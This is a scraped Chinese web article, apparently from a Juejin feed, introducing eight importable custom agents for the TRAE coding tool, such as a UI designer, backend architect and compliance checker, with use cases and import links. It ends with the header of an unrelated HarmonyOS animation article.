                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9e0d91ea29be403ea8f08e9c3c89cc41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=IlXT3cYI%2FmfofW5mTFCeaDxl6Zc%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>本文作者：桔梗，TRAE 技术专家；Jiaqi，TRAE 技术文档工程师</p>
</blockquote>
<p>针对项目开发中的不同场景，我们提供了一系列可直接导入 TRAE 并使用的自定义智能体示例。这些智能体可以被单独调用，或在开发流程的相应阶段由 SOLO Coder 自动调用，以完成特定任务。同时，这些自定义智能体也可以作为参考模板，你可以根据实际需求调整现有配置。</p>
<p>只需要在电脑端访问下表中相应的链接，即可将这些智能体快速导入 TRAE 中并使用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a96f1215441e4cf0b07488651d7a1189~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=CW4VIgltQmyOHO2%2FRLR3gJeVLEU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0"><strong>UI 设计师</strong></h2>
<h3 data-id="heading-1"><strong>智能体名称</strong></h3>
<p>UI Designer</p>
<h3 data-id="heading-2"><strong>使用场景</strong></h3>
<p>UI Designer（ui-designer） 是一个专业的 UI/UX 设计智能体，用于创建界面、设计组件、搭建设计系统和提升视觉美感。它兼顾可访问性、用户体验、组件一致性和跨平台适配，能提供可落地的设计方案和技术指导。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>组件库设计：</strong> 设计统一按钮、表单等组件，包含多种状态和变体。</p>
</li>
<li>
<p><strong>界面优化：</strong> 改善布局和视觉层级，提升可用性。</p>
</li>
<li>
<p><strong>设计系统建设：</strong> 标准化颜色、排版、间距等设计 token，保证跨产品一致性。</p>
</li>
<li>
<p><strong>跨平台适配：</strong> 确保界面在不同屏幕和设备上表现一致。</p>
</li>
</ul>
<h3 data-id="heading-3"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li>
<p><strong>TRAE 中国版：</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F8fdcb7" target="_blank" title="https://s.trae.com.cn/a/8fdcb7" ref="nofollow noopener noreferrer">s.trae.com.cn/a/8fdcb7</a></p>
</li>
<li>
<p><strong>TRAE 国际版：</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F878f64" target="_blank" title="https://s.trae.ai/a/878f64" ref="nofollow noopener noreferrer">s.trae.ai/a/878f64</a></p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee3315025f8b4bc38431475d4692adf2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=uyaIq%2FsNeejWw6byyfgM1KKLC7U%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/165dcfaba680418cb67f8b4f5f44c248~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=RA9iyYDKhn7Y9n6ZexfXYqZr9UI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-4"><strong>前端架构师</strong></h2>
<h3 data-id="heading-5"><strong>智能体名称</strong></h3>
<p>Frontend Architect</p>
<h3 data-id="heading-6"><strong>使用场景</strong></h3>
<p>Frontend Architect（frontend-architect） 是一个专业的前端架构智能体，擅长构建高性能、可扩展的前端界面，涵盖 React、Vue 和 Angular 等主流框架。它能够在组件开发、状态管理、性能优化、跨浏览器适配等方面提供专业指导，并输出可落地的前端实现方案。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>界面开发：</strong> 实现响应式、可访问的 UI，确保与设计系统一致，并支持动画和交互优化。</p>
</li>
<li>
<p><strong>组件架构：</strong> 设计可复用、可维护的组件体系，管理生命周期和组件接口。</p>
</li>
<li>
<p><strong>状态管理：</strong> 处理复杂状态逻辑，选型并实现 Redux、Vuex、NgRx 等状态管理方案。</p>
</li>
<li>
<p><strong>性能优化：</strong> 通过代码拆分、懒加载、虚拟滚动等技术提升渲染和加载效率。</p>
</li>
<li>
<p><strong>前端工程与质量保障：</strong> 配置构建工具、CI/CD、测试体系，确保代码质量、安全性和可维护性。</p>
</li>
</ul>
<h3 data-id="heading-7"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F3fbe5a" target="_blank" title="https://s.trae.com.cn/a/3fbe5a" ref="nofollow noopener noreferrer">s.trae.com.cn/a/3fbe5a</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2Ff8219e" target="_blank" title="https://s.trae.ai/a/f8219e" ref="nofollow noopener noreferrer">s.trae.ai/a/f8219e</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b814b287fe54a55b3086089602bcc82~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=7hf2IA9hLtMvYD0GDSXx9umR2o8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8"><strong>后端架构师</strong></h2>
<h3 data-id="heading-9"><strong>智能体名称</strong></h3>
<p>Backend Architect</p>
<h3 data-id="heading-10"><strong>使用场景</strong></h3>
<p>Backend Architect（backend-architect） 是一个专业的后端架构智能体，擅长设计高性能、可扩展且安全的服务器端系统。它能够在 API 设计、业务逻辑实现、数据库架构、系统性能优化和可扩展性等方面提供专业指导，并输出可落地的后端解决方案。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>API 设计：</strong> 设计 RESTful 或 GraphQL 接口，规范请求/响应、认证和版本管理。</p>
</li>
<li>
<p><strong>业务逻辑实现：</strong> 构建可扩展的服务层，处理复杂业务规则、异步任务和缓存策略。</p>
</li>
<li>
<p><strong>数据库架构与优化：</strong> 设计高效数据库结构，优化查询性能，选择合适的数据存储方案。</p>
</li>
<li>
<p><strong>系统性能与可扩展性：</strong> 实现负载均衡、自动扩容、高可用和监控告警体系。</p>
</li>
<li>
<p><strong>安全与运维：</strong> 保证认证授权、数据加密、合规性，配置 CI/CD、容器化和基础设施管理。</p>
</li>
</ul>
<h3 data-id="heading-11"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F441a24" target="_blank" title="https://s.trae.com.cn/a/441a24" ref="nofollow noopener noreferrer">s.trae.com.cn/a/441a24</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F92731a" target="_blank" title="https://s.trae.ai/a/92731a" ref="nofollow noopener noreferrer">s.trae.ai/a/92731a</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ceed2d16a6f4431bb84b3f7a0ae135e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=gDuCFGz8MnvwqbE4EKB%2BYgskZvM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09e89498e84640c186104663aae7d5a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=MOaBHVEMT%2FsJGT%2BN8hfJBI2cJzw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12"><strong>API 测试工程师</strong></h2>
<h3 data-id="heading-13"><strong>智能体名称</strong></h3>
<p>API Test Pro</p>
<h3 data-id="heading-14"><strong>使用场景</strong></h3>
<p>API Test Pro（api-test-pro） 是一个专业的 API 测试智能体，擅长功能验证、性能测试、负载测试和契约合规检查。它能够全面评估 REST、GraphQL、gRPC 等接口的可靠性、性能和安全性，并提供可落地的测试报告与改进建议。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>契约测试：</strong> 验证 API 与 OpenAPI/Swagger 规范一致，确保请求/响应符合设计。</p>
</li>
<li>
<p><strong>功能测试：</strong> 检测各接口的有效/无效输入处理、边界情况、错误处理和业务逻辑正确性。</p>
</li>
<li>
<p><strong>性能测试：</strong> 评估接口响应时间、识别瓶颈、验证性能 SLA。</p>
</li>
<li>
<p><strong>负载测试：</strong> 模拟并发用户、压力场景，检查系统在高负载下的稳定性和降级策略。</p>
</li>
<li>
<p><strong>安全测试：</strong> 发现常见漏洞，如 SQL 注入、XSS、认证绕过等。</p>
</li>
</ul>
<h3 data-id="heading-15"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F1ea8bb" target="_blank" title="https://s.trae.com.cn/a/1ea8bb" ref="nofollow noopener noreferrer">s.trae.com.cn/a/1ea8bb</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F55b143" target="_blank" title="https://s.trae.ai/a/55b143" ref="nofollow noopener noreferrer">s.trae.ai/a/55b143</a></p>
<p>如实例图所示，在项目重构中，SOLO Coder 先后调用了 UI 设计师、前端架构师、后端架构师和 API 测试工程师来协同完成任务。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40e5d6aa081247fbb1da74689789955d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=LictVjmvBGxIn%2Fa%2BKQi90sUw4Cc%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57d1c8c212d046e0bfdbadb91ffdd0ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=VcyJ5IWuBop6QQuJea1F8IdC0Ek%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-16"><strong>AI 集成工程师</strong></h2>
<h3 data-id="heading-17"><strong>智能体名称</strong></h3>
<p>AI Integration Eng</p>
<h3 data-id="heading-18"><strong>使用场景</strong></h3>
<p>AI Integration Engineer（ai-integration-engineer） 是一个专业的 AI/ML 集成智能体，擅长将人工智能功能整合到应用中，包括语言模型集成、推荐系统构建和智能自动化实现。它能够提供可落地的 AI 解决方案，兼顾性能、可靠性和业务价值。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>语言模型集成：</strong> 将 GPT 等大模型接入应用，处理对话、文本生成或自然语言理解任务。</p>
</li>
<li>
<p><strong>推荐系统开发：</strong> 构建基于协同过滤、内容或混合算法的个性化推荐引擎，支持实时推送与冷启动处理。</p>
</li>
<li>
<p><strong>智能自动化：</strong> 实现动态定价、流程自动化或决策系统，结合规则与 ML 预测提升效率。</p>
</li>
<li>
<p><strong>模型部署与优化：</strong> 容器化部署、蓝绿/金丝雀发布、性能优化和监控，确保模型可靠运行。</p>
</li>
<li>
<p><strong>数据与安全管理：</strong> 设计可扩展数据管道、隐私保护机制、偏差检测与合规性措施。</p>
</li>
</ul>
<h3 data-id="heading-19"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F16c32c" target="_blank" title="https://s.trae.com.cn/a/16c32c" ref="nofollow noopener noreferrer">s.trae.com.cn/a/16c32c</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F720a05" target="_blank" title="https://s.trae.ai/a/720a05" ref="nofollow noopener noreferrer">s.trae.ai/a/720a05</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b29ab31fd4ca4c0aa5f895c69798d981~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=%2F16jyp2enh6ChvjXwiX2P1Uv8KA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-20"><strong>DevOps 工程师</strong></h2>
<h3 data-id="heading-21"><strong>智能体名称</strong></h3>
<p>DevOps Architect</p>
<h3 data-id="heading-22"><strong>使用场景</strong></h3>
<p>DevOps Architect（devops-architect） 是一个专业的 DevOps 智能体，擅长构建自动化基础设施、CI/CD 流水线和监控系统，确保软件快速、可靠、安全地交付，并具备高可用性和可扩展性。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>CI/CD 流水线：</strong> 设计和实现自动化构建、测试和部署，支持回滚与多分支策略。</p>
</li>
<li>
<p><strong>云基础设施配置：</strong> 搭建可扩展、高可用、安全的云环境（AWS/Azure/GCP），使用基础设施即代码管理资源。</p>
</li>
<li>
<p><strong>监控与可观测性：</strong> 配置系统监控、告警、日志聚合和分布式追踪，提供可操作的运行洞察。</p>
</li>
<li>
<p><strong>部署自动化：</strong> 实现蓝绿、金丝雀、滚动部署策略，自动化数据库迁移和环境管理。</p>
</li>
<li>
<p><strong>安全与合规：</strong> 管理权限、密钥、加密和审计，确保符合 SOC2、HIPAA、PCI-DSS 等标准。</p>
</li>
</ul>
<h3 data-id="heading-23"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2Fbab503" target="_blank" title="https://s.trae.com.cn/a/bab503" ref="nofollow noopener noreferrer">s.trae.com.cn/a/bab503</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F8a2ce1" target="_blank" title="https://s.trae.ai/a/8a2ce1" ref="nofollow noopener noreferrer">s.trae.ai/a/8a2ce1</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97a0d5ad28384211ba2b06de1cf90823~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=DD3aDKO9BT43rHQrQENjrzbI3OY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18b76553ee3745f9a97d12c676bceabb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=A5Xv9ZTyvwO9b5Ko%2Bd0YILjSW9o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-24"><strong>性能优化师</strong></h2>
<h3 data-id="heading-25"><strong>智能体名称</strong></h3>
<p>Performance Expert</p>
<h3 data-id="heading-26"><strong>使用场景</strong></h3>
<p>Performance Expert（performance-expert） 是一个专业的性能优化智能体，擅长系统、应用和数据库的性能分析与优化。它能够发现瓶颈、进行性能测试和压力测试，并提供可执行的优化方案，从而提升响应速度、吞吐量和整体系统效率。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>性能测试：</strong> 设计和执行负载、压力和耐久性测试，建立性能基准并模拟实际用户行为。</p>
</li>
<li>
<p><strong>性能分析与诊断：</strong> 对代码、数据库、前端和基础设施进行多层级分析，定位瓶颈和热点问题。</p>
</li>
<li>
<p><strong>系统优化：</strong> 从应用代码、数据库查询到基础设施配置，提供端到端性能改进建议。</p>
</li>
<li>
<p><strong>代码与数据库优化：</strong> 改进算法、数据结构、查询效率、缓存策略和 ORM 使用。</p>
</li>
<li>
<p><strong>基础设施优化：</strong> 调整线程池、容器配置、操作系统参数、负载均衡和 CDN 策略以提升整体性能。</p>
</li>
<li>
<p><strong>质量保证与报告：</strong> 提供清晰的性能分析报告、优化建议和验证方法，确保优化可衡量、可重复。</p>
</li>
</ul>
<h3 data-id="heading-27"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F7bb287" target="_blank" title="https://s.trae.com.cn/a/7bb287" ref="nofollow noopener noreferrer">s.trae.com.cn/a/7bb287</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2F00067d" target="_blank" title="https://s.trae.ai/a/00067d" ref="nofollow noopener noreferrer">s.trae.ai/a/00067d</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e76487d18c9d494fbdf3d8c3422a6c55~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgVFJBRV9haQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766467989&amp;x-signature=eVw5SKfI3AiYENC%2FyBI584MVgzk%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-28"><strong>合规审查员</strong></h2>
<h3 data-id="heading-29"><strong>智能体名称</strong></h3>
<p>Compliance Checker</p>
<h3 data-id="heading-30"><strong>使用场景</strong></h3>
<p>Compliance Checker（compliance-checker） 是一个专业的法律合规模拟智能体，擅长审查法律文件、隐私政策和服务条款，确保符合各类法规和行业标准。它能够识别潜在风险、提出改进建议，并帮助企业降低法律合规风险。</p>
<p>主要使用场景如下：</p>
<ul>
<li>
<p><strong>文件审查：</strong> 检查服务条款、隐私政策等法律文档，识别缺失条款、歧义或过时内容。</p>
</li>
<li>
<p><strong>法规合规评估：</strong> 根据 GDPR、CCPA、PIPEDA、COPPA 等法规分析文档合规性，提供整改建议。</p>
</li>
<li>
<p><strong>风险识别与缓解：</strong> 发现可能带来法律责任的条款、消费者保护问题、知识产权或用户内容风险。</p>
</li>
<li>
<p><strong>最佳实践建议：</strong> 提供标准条款示例，优先级整改清单，并给出实施时间表和法律依据引用。</p>
</li>
<li>
<p><strong>操作指南：</strong> 区分法律要求与最佳实践，确保建议可落地、实用且符合法律标准。</p>
</li>
</ul>
<h3 data-id="heading-31"><strong>链接</strong></h3>
<p>访问以下链接，直接将智能体导入 TRAE 对应的版本中使用。</p>
<ul>
<li><strong>TRAE 中国版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.com.cn%2Fa%2F7a3bf7" target="_blank" title="https://s.trae.com.cn/a/7a3bf7" ref="nofollow noopener noreferrer">s.trae.com.cn/a/7a3bf7</a></p>
<ul>
<li><strong>TRAE 国际版：</strong></li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fs.trae.ai%2Fa%2Fc10186" target="_blank" title="https://s.trae.ai/a/c10186" ref="nofollow noopener noreferrer">s.trae.ai/a/c10186</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[鸿蒙技术干货11：属性动画与转场效果实战]]></title>    <link>https://juejin.cn/post/7583973472323141647</link>    <guid>https://juejin.cn/post/7583973472323141647</guid>    <pubDate>2025-12-16T03:27:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583973472323141647" data-draft-id="7583955708318597120" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="鸿蒙技术干货11：属性动画与转场效果实战"/> <meta itemprop="keywords" content="HarmonyOS"/> <meta itemprop="datePublished" content="2025-12-16T03:27:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="赵浩生"/> <meta itemprop="url" content="https://juejin.cn/user/4185170523982995"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            鸿蒙技术干货11：属性动画与转场效果实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4185170523982995/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    赵浩生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T03:27:03.000Z" title="Tue Dec 16 2025 03:27:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
